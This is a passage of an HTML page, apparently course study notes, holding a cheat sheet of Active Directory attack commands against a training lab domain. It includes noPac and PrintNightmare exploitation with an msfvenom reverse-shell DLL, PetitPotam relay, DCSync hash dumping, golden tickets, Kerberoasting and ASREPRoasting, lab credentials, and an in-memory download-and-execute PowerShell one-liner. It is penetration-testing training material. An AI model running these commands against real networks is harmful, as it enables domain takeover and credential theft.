+<td>Runs <code>scanner.py</code> to check if a target system is vulnerable to <code>noPac</code>/<code>Sam_The_Admin</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code></td>
+<td>Used to exploit the <code>noPac</code>/<code>Sam_The_Admin</code>  vulnerability and gain a SYSTEM shell (<code>-shell</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</code></td>
+<td>Used to exploit the <code>noPac</code>/<code>Sam_The_Admin</code>  vulnerability and perform a <code>DCSync</code> attack against the built-in Administrator account on a Domain Controller from a Linux-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="printnightmare">PrintNightmare</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>git clone https://github.com/cube0x0/CVE-2021-1675.git</code></td>
+<td>Used to clone a PrintNightmare exploit  using git from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install</code></td>
+<td>Used to ensure the exploit author's (<code>cube0x0</code>) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>rpcdump.py @172.16.5.5 \| egrep 'MS-RPRN\|MS-PAR'</code></td>
+<td>Used to check if a Windows target has <code>MS-PAR</code> &amp; <code>MSRPRN</code> exposed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll &gt; backupscript.dll</code></td>
+<td>Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>sudo smbserver.py -smb2support CompData /path/to/backupscript.dll</code></td>
+<td>Used to create an SMB server and host a shared folder (<code>CompData</code>) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo python3 CVE-2021-1675.py inlanefreight.local/&lt;username&gt;:&lt;password&gt;@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'</code></td>
+<td>Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="petitpotam">PetitPotam</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</code></td>
+<td>Impacket tool used to create an <code>NTLM relay</code> by specifiying the web enrollment URL for the <code>Certificate Authority</code> host. Perfomred from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>git clone https://github.com/topotam/PetitPotam.git</code></td>
+<td>Used to clone the <code>PetitPotam</code> exploit using git. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>python3 PetitPotam.py 172.16.5.225 172.16.5.5</code></td>
+<td>Used to execute the PetitPotam exploit by  specifying the IP address of the attack host (<code>172.16.5.255</code>) and the target Domain Controller (<code>172.16.5.5</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 &lt;base64 certificate&gt; = dc01.ccache</code></td>
+<td>Uses <code>gettgtpkinit</code>.py to request a TGT ticket for the Domain Controller (<code>dc01.ccache</code>) from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code></td>
+<td>Impacket tool used to perform a DCSync attack and retrieve one or all of the <code>NTLM password hashes</code> from the target Windows domain. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>klist</code></td>
+<td><code>krb5-user</code> command used to view the contents of the <code>ccache</code> file. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$</code></td>
+<td>Used to submit TGS requests using <code>getnthash.py</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba</code></td>
+<td>Impacket tool used to extract hashes from <code>NTDS.dit</code> using a <code>DCSync attack</code> and a captured hash (<code>-hashes</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /&lt;base64 certificate&gt;=/ptt</code></td>
+<td>Uses Rubeus to request a TGT and perform a <code>pass-the-ticket attack</code> using the machine account (<code>/user:ACADEMY-EA-DC01$</code>) of a Windows target. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt</code></td>
+<td>Performs a DCSync attack using <code>Mimikatz</code>. Performed from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="miscellaneous-misconfigurations">Miscellaneous Misconfigurations</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Import-Module .\SecurityAssessment.ps1</code></td>
+<td>Used to import the module <code>Security Assessment.ps1</code>. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code></td>
+<td>SecurityAssessment.ps1 based tool used to enumerate a Windows target for <code>MS-PRN Printer bug</code>. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>adidnsdump -u inlanefreight\\forend ldap://172.16.5.5</code></td>
+<td>Used to resolve all records in a DNS zone over <code>LDAP</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r</code></td>
+<td>Used to resolve unknown records in a DNS zone by performing an <code>A query</code> (<code>-r</code>) from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser * \| Select-Object samaccountname,description</code></td>
+<td>PowerView tool used to display the description field of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser -UACFilter PASSWD_NOTREQD \| Select-Object samaccountname,useraccountcontrol</code></td>
+<td>PowerView tool used to check for the <code>PASSWD_NOTREQD</code> setting of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts</code></td>
+<td>Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="group-policy-enumeration-attacks">Group Policy Enumeration &amp; Attacks</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE</code></td>
+<td>Tool used to decrypt a captured <code>group policy preference password</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>crackmapexec smb -L \| grep gpp</code></td>
+<td>Locates and retrieves a <code>group policy preference password</code> using <code>CrackMapExec</code>, the filters the output using <code>grep</code>. Peformed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</code></td>
+<td>Locates and retrieves any credentials stored in the <code>SYSVOL</code> share of a Windows target using <code>CrackMapExec</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainGPO \| select displayname</code></td>
+<td>PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-GPO -All \| Select DisplayName</code></td>
+<td>PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$sid=Convert-NameToSid "Domain Users"</code></td>
+<td>Creates a variable called <code>$sid</code> that is set equal to the <code>Convert-NameToSid</code> tool and specifies the group account <code>Domain Users</code>. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainGPO \| Get-ObjectAcl \| ?{$_.SecurityIdentifier -eq $sid</code></td>
+<td>PowerView tool that is used to check if the <code>Domain Users</code>  (<code>eq $sid</code>) group has any rights over one or more GPOs. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532</code></td>
+<td>PowerShell cmd-let used to display the name of a GPO given a <code>GUID</code>. Performed from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="asreproasting">ASREPRoasting</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Get-DomainUser -PreauthNotRequired \| select samaccountname,userprincipalname,useraccountcontrol \| fl</code></td>
+<td>PowerView based tool used to search for the <code>DONT_REQ_PREAUTH</code> value across in user accounts in a target Windows domain. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</code></td>
+<td>Uses <code>Rubeus</code> to perform an <code>ASEP Roasting attack</code> and formats the output for <code>Hashcat</code>. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt</code></td>
+<td>Uses <code>Hashcat</code> to attempt to crack the captured hash using a wordlist (<code>rockyou.txt</code>). Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt</code></td>
+<td>Enumerates users in a target Windows domain and automatically retrieves the <code>AS</code> for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="trust-relationships-child-parent-trusts">Trust Relationships - Child &gt; Parent Trusts</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Import-Module activedirectory</code></td>
+<td>Used to import the <code>Active Directory</code> module. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-ADTrust -Filter *</code></td>
+<td>PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainTrust</code></td>
+<td>PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainTrustMapping</code></td>
+<td>PowerView tool used to perform a domain trust mapping from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \| select SamAccountName</code></td>
+<td>PowerView tools used to enumerate users in a target child domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt</code></td>
+<td>Uses Mimikatz to obtain the <code>KRBTGT</code> account's <code>NT Hash</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainSID</code></td>
+<td>PowerView tool used to get the SID for a target child domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" \| select distinguishedname,objectsid</code></td>
+<td>PowerView tool used to obtain the <code>Enterprise Admins</code> group's SID from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>ls \\academy-ea-dc01.inlanefreight.local\c$</code></td>
+<td>Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</code></td>
+<td>Uses <code>Mimikatz</code> to create a <code>Golden Ticket</code> from a Windows-based host .</td>
+</tr>
+<tr>
+<td><code>.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt</code></td>
+<td>Uses <code>Rubeus</code> to create a <code>Golden Ticket</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm</code></td>
+<td>Uses <code>Mimikatz</code> to perform a DCSync attack from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code></td>
+<td>Impacket tool used to perform a DCSync attack from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240</code></td>
+<td>Impacket tool used to perform a <code>SID Brute forcing</code> attack from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \| grep "Domain SID"</code></td>
+<td>Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \| grep -B12 "Enterprise Admins"</code></td>
+<td>Impacket tool used to retrieve the <code>SID</code> of a target Windows domain and attach it to the Enterprise Admin group's <code>RID</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</code></td>
+<td>Impacket tool used to create a <code>Golden Ticket</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>export KRB5CCNAME=hacker.ccache</code></td>
+<td>Used to set the <code>KRB5CCNAME Environment Variable</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5</code></td>
+<td>Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code></td>
+<td>Impacket tool that automatically performs an attack that escalates from child to parent domain.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="trust-relationships-cross-forest">Trust Relationships - Cross-Forest</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \| select SamAccountName</code></td>
+<td>PowerView tool used to enumerate accounts for associated <code>SPNs</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \| select samaccountname,memberof</code></td>
+<td>PowerView tool used to enumerate the <code>mssqlsvc</code> account from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</code></td>
+<td>Uses <code>Rubeus</code> to perform a Kerberoasting Attack against a target Windows domain (<code>/domain:FREIGHTLOGISTICS.local</code>) from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL</code></td>
+<td>PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator</code></td>
+<td>PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley</code></td>
+<td>Impacket tool used to request (<code>-request</code>) the TGS ticket of an account in a target Windows domain (<code>-target-domain</code>) from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</code></td>
+<td>Runs the Python implementation of <code>BloodHound</code> against a target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>zip -r ilfreight_bh.zip *.json</code></td>
+<td>Used to compress multiple files into 1 single <code>.zip</code> file to be uploaded into the BloodHound GUI.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="harnessing-powershell">Harnessing PowerShell</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Get-Module</code></td>
+<td>Lists available modules loaded for use.</td>
+</tr>
+<tr>
+<td><code>Get-ExecutionPolicy -List</code></td>
+<td>Will print the execution policy settings for each scope on a host.</td>
+</tr>
+<tr>
+<td><code>Set-ExecutionPolicy Bypass -Scope Process</code></td>
+<td>This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.</td>
+</tr>
+<tr>
+<td><code>Get-Content C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</code></td>
+<td>With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.</td>
+</tr>
+<tr>
+<td><code>powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); &lt;follow-on commands&gt;"</code></td>
+<td>This is a quick and easy way to download a file from the web using PowerShell and call it from memory.</td>
+</tr>
+<tr>
+<td><code>Get-ChildItem Env: \| ft Key,Value</code></td>
+<td>Return environment values such as key paths, users, computer information, etc.</td>
+</tr>
+</tbody>
+</table>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://barbakadze.medium.com/" target="_blank" rel="noopener" title="barbakadze.medium.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4.21 0A4.2 4.2 0 0 0 0 4.21v15.58A4.2 4.2 0 0 0 4.21 24h15.58A4.2 4.2 0 0 0 24 19.79v-1.093a5 5 0 0 1-.422.02c-2.577 0-4.027-2.146-4.09-4.832a8 8 0 0 1 .022-.708c.093-1.186.475-2.241 1.105-3.022a3.9 3.9 0 0 1 1.395-1.1c.468-.237 1.127-.367 1.664-.367h.023q.151 0 .303.01V4.211A4.2 4.2 0 0 0 19.79 0Zm.198 5.583h4.165l3.588 8.435 3.59-8.435h3.864v.146l-.019.004c-.705.16-1.063.397-1.063 1.254h-.003l.003 10.274c.06.676.424.885 1.063 1.03l.02.004v.145h-4.923v-.145l.019-.005c.639-.144.994-.353 1.054-1.03V7.267l-4.745 11.15h-.261L6.15 7.569v9.445c0 .857.358 1.094 1.063 1.253l.02.004v.147H4.405v-.147l.019-.004c.705-.16 1.065-.397 1.065-1.253V6.987c0-.857-.358-1.094-1.064-1.254l-.018-.004zm19.25 3.668c-1.086.023-1.733 1.323-1.813 3.124H24V9.298a1.4 1.4 0 0 0-.342-.047m-1.862 3.632c-.1 1.756.86 3.239 2.204 3.634v-3.634z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/gbarbakadz" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["content.code.copy", "content.action.edit", "content.action.view", "content.tooltips", "navigation.tracking", "navigation.top", "navigation.sections", "navigation.path", "search.share", "search.suggest"], "search": "../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.e71a0d61.min.js"></script>
+      
+    
+  </body>
+</html>
